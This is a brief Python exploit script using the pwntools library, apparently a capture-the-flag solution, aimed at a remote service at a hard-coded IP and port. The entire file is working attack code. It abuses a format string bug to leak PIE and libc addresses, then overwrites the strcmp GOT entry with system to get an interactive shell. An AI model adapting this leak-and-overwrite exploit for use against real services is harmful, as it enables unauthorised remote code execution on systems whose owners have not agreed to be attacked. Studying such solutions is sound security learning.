#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

p = remote('182.92.203.154', 35264)
# p = process('./pwn')

stdin_offset = 0x3c48e0
cmd = 0x153b
strcmp_offset = 0x0000000000203080
bss = 0x203160 + 0x40
system_offset = 0x453a0


def shell(payload):
  p.sendlineafter('$', 'fg %11' + payload)

if __name__ == "__main__":
  shell("%p" * 50)
  pie = int(p.recvuntil('53b')[-14:], 16) - cmd
  success('PIE  :\t' + str(hex(pie)))

  shell('%p%115$p')
  libc = int(p.recvuntil('1d4')[-14:], 16) - 0x841d4
  success('LIBC: \t' + str(hex(libc)))

  system = system_offset + libc
  strcmp = strcmp_offset + pie
  payload = fmtstr_payload(173, {strcmp:system}, numbwritten=2)
  shell('%p' + payload)
  p.interactive()